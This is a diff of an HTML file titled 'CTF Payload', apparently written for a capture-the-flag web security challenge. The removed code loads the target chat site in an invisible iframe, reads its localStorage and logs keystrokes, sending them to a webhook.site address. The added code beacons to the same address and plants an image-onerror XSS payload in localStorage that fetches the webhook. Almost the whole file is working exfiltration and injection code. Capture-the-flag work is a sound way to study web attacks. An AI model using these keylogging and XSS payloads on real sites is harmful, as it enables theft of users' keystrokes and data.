@@ -1,59 +1,17 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>CTF Payload</title>
-</head>
 <body>
-
-<h3>Loading…</h3>
-
-<iframe
-  id="chatFrame"
-  src="https://chat.owley-madison.jeopardy.websec.saarland/"
-  style="width:0;height:0;border:0;">
-</iframe>
-
 <script>
+
 new Image().src =
         "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
-        encodeURIComponent(document.location.hostname);
+        encodeURIComponent("testing");
 
-//document.domain = "websec.saarland";
-const frame = document.getElementById("chatFrame");
+  localStorage.setItem("favorites",
+    JSON.stringify(['<img src=x onerror=fetch("https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" + encodeURIComponent("testing3"))>'])
+  );
 
-frame.onload = () => {
-  try {
-    const chatDoc = frame.contentWindow.document;
-
-    console.log("[+] iframe accessed");
-    console.log("[+] title:", chatDoc.title);
-
-    const ls = frame.contentWindow.localStorage;
-    console.log("[+] localStorage keys:", Object.keys(ls));
-
-    new Image().src =
-        "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
-        encodeURIComponent("testing2");
-  let d = "";
-
-  chatDoc.addEventListener("keydown", (e) => {
-    d += e.key;
-
-    if (d.length > 5) {
-      new Image().src =
-        "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
-        encodeURIComponent(d);
-
-      d = "";
-    }
-  });   
-
-  } catch (e) {
-    console.error("Access failed:", e);
-  }
-};
+  //window.location = "https://match.owley-madison.jeopardy.websec.saarland/";
 </script>
-
 </body>
 </html>
